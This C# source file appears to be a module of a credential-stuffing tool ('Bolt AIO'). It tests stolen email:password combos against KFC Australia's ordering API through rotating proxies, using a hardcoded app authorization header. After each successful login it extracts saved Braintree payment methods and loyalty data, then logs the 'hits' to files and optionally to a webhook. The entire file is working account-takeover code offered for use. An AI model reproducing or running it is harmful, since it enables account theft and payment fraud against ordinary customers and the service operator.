using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class KFCMod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text5 = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                            req.AddHeader("X-Api-Channel", "Android App");
                            req.AddHeader("X-Api-AppPlatform", "5");
                            req.AddHeader("x-api-custom-auth",
                                "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("X-Api-CompanyCode", "KFAU001");
                            req.AddHeader("Authorization", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("Connection", "Keep-Alive");
                            req.AddHeader("Accept-Encoding", "gzip");
                            req.AddHeader("User-Agent", "okhttp/3.9.1");

                            var res0 = req.Get(
                                "https://nolo-api-ssa.ncrsaas.com/v1/loyaltyproxy/YAM02/company/profileconfiguration");
                            var text0 = res0.ToString();

                            req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                            req.AddHeader("X-Api-Channel", "Android App");
                            req.AddHeader("X-Api-AppPlatform", "5");
                            req.AddHeader("x-api-custom-auth",
                                "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("X-Api-CompanyCode", "KFAU001");
                            req.AddHeader("Authorization", "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                            req.AddHeader("Connection", "Keep-Alive");
                            req.AddHeader("Accept-Encoding", "gzip");
                            req.AddHeader("User-Agent", "okhttp/3.9.1");

                            var res1 = req.Post("https://nolo-api-ssa.ncrsaas.com/v1/Authenticate/2FA",
                                "{\"Email\":\"" + array[0] + "\",\"Password\":\"" + array[1] + "\"}",
                                "application/json");
                            var text1 = res1.ToString();

                            if (text1.Contains("{\"$id\":\"1\",\"access_token\":\""))
                            {
                                var haha = Functions.LR(text1, "\"id_token\":\"", "\"").FirstOrDefault();
                                var haha2 = Functions.Base64Decode("" + haha + "");
                                var client = Functions.LR("" + haha2 + "", "\"CustomerId\":\"", "\"").FirstOrDefault();
                                var numb = Functions.LR("" + haha2 + "", "\"LoyaltyId\":\"", "\"").FirstOrDefault();
                                req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                                req.AddHeader("X-Api-Channel", "Android App");
                                req.AddHeader("X-Api-AppPlatform", "5");
                                req.AddHeader("x-api-custom-auth",
                                    "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("X-Api-CompanyCode", "KFAU001");
                                req.AddHeader("Authorization",
                                    "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("Connection", "Keep-Alive");
                                req.AddHeader("Accept-Encoding", "gzip");
                                req.AddHeader("User-Agent", "okhttp/3.9.1");

                                var res2 = req.Post(
                                    "https://nolo-api-ssa.ncrsaas.com/v1/Customers/Braintree/OneTimeToken",
                                    "{\"CustomerId\":\"" + client + "\",\"SiteId\":196}", "application/json");
                                var text2 = res2.ToString();

                                var xx = Functions.LR(text2, "\"", "\"").FirstOrDefault();
                                var auths = Functions.Base64Decode("" + xx + "");
                                var fingers = Functions
                                    .LR("" + auths + "", "authorizationFingerprint\":\"", "?customer_id=")
                                    .FirstOrDefault();
                                req.AllowAutoRedirect = false;
                                req.AddHeader("User-Agent",
                                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0");
                                req.AddHeader("Accept", "*/*");
                                req.AddHeader("Accept-Language", "en-US,en;q=0.5");
                                req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                req.AddHeader("Origin", "https://order.kfc.com.au");
                                req.AddHeader("Referer", "https://order.kfc.com.au/");
                                req.AddHeader("Connection", "keep-alive");

                                var res3 = req.Get(
                                    "https://api.braintreegateway.com/merchants/bhgb6k22pw4bdyc3/client_api/v1/payment_methods?defaultFirst=1&braintreeLibraryVersion=braintree%2Fweb%2F3.37.0&_meta%5BmerchantAppId%5D=order.kfc.com.au&_meta%5Bplatform%5D=web&_meta%5BsdkVersion%5D=3.37.0&_meta%5Bsource%5D=client&_meta%5Bintegration%5D=custom&_meta%5BintegrationType%5D=custom&_meta%5BsessionId%5D=95d6d73f-40dd-4849-8743-e18af7e36ab9&authorizationFingerprint=" +
                                    fingers + "%3Fcustomer_id%3D");
                                var text3 = res3.ToString();

                                var payment = Functions.LR(text3, "{\"paymentMethods\":[{\"", "}").FirstOrDefault();
                                capture.Append(" | payment = " + payment);
                                req.AddHeader("X-Api-AppVersion", "19.9.2.0");
                                req.AddHeader("X-Api-Channel", "Android App");
                                req.AddHeader("X-Api-AppPlatform", "5");
                                req.AddHeader("x-api-custom-auth",
                                    "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("X-Api-CompanyCode", "KFAU001");
                                req.AddHeader("Authorization",
                                    "Basic S0ZBVTAwMVByb2RAbmNyLmNvbTpNTExscDd2b3JPSXJOdVo2");
                                req.AddHeader("Connection", "Keep-Alive");
                                req.AddHeader("Accept-Encoding", "gzip");
                                req.AddHeader("User-Agent", "okhttp/3.9.1");

                                var res4 = req.Get("https://nolo-api-ssa.ncrsaas.com/v1/loyaltyproxy/YAM02/members/" +
                                                   numb + "/extendedstandings");
                                var text4 = res4.ToString();

                                if (payment.Any())
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;

                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("KFC", array[0] + ":" + array[1] + " | " + capture);
                                    Export.AsResult("/KfcAus_hits", array[0] + ":" + array[1] + " | " + capture);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + capture,
                                            "KFC Hits");
                                }
                                else if (text4.Contains(
                                             "rewardName\":\"20% Employee Discount\",\"bprewardThreshold\":1.0,\"tierID\":5,\"rewardType\":\"Real-Time Discount\"}],\"availableRewards\":[]") ||
                                         numb.Contains("\",") || !numb.Any())
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/KfcAus_frees", array[0] + ":" + array[1] + " | " + capture);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("KFC", array[0] + ":" + array[1] + " | " + capture);
                                }
                            }
                            else if (!text1.Contains("{\"$id\":\"1\",\"access_token\":\""))
                            {
                                break;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text5);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}